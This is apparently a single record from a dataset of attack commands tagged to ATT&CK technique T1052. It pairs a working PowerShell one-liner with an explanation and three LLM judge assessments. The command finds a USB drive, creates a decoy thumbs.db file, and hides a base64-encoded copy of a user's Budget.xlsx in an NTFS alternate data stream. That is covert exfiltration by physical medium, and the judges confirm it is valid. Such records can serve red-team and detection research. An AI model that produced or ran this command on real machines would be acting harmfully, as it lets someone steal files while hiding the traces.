command: $usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\'; $carrier=Join-Path $usb 'thumbs.db'; if(-not (Test-Path $carrier)){ [IO.File]::WriteAllBytes($carrier,[byte[]]@()) }; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\Budget.xlsx')) | Out-File -Encoding ASCII ($carrier+':cache')
explanation: Stashes base64-encoded content inside an alternate data stream on a file located on the USB device.
rationale_steps: Ensure carrier file exists on removable media
Write encoded data to NTFS alternate data stream on USB

llm_judgments.syntactic_justification: Valid PowerShell with balanced quotes/parentheses, proper separators, and correct use of cmdlets and .NET methods and parameters.
llm_judgments.semantic_justification: It locates a removable drive, creates a carrier file, and writes base64 data to an alternate data stream consistent with physical exfiltration and hiding, but it assumes a present NTFS-formatted USB and will fail on non-NTFS or absent removable media.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced parentheses, proper semicolons, and valid cmdlet usage, though the alternate data stream path construction ($carrier+':cache') uses string concatenation that works but is slightly unconventional compared to using a dedicated ADS path format.
llm_judgments.semantic_justification: The command accurately implements T1052 by detecting a removable USB drive, creating a decoy file (thumbs.db) on it, base64-encoding a target document (Budget.xlsx), and hiding the encoded data in an NTFS alternate data stream named 'cache' on that file — combining physical medium exfiltration with obfuscation/steganography as described in the technique.

llm_judgments.syntactic_justification: The command is a series of well-formed PowerShell statements using valid cmdlets, .NET classes, and correct syntax for variable assignment and piping.
llm_judgments.semantic_justification: The command successfully identifies a removable drive and writes data to an alternate data stream; however, it assumes the USB drive is formatted with NTFS, as FAT32 and exFAT do not support ADS.
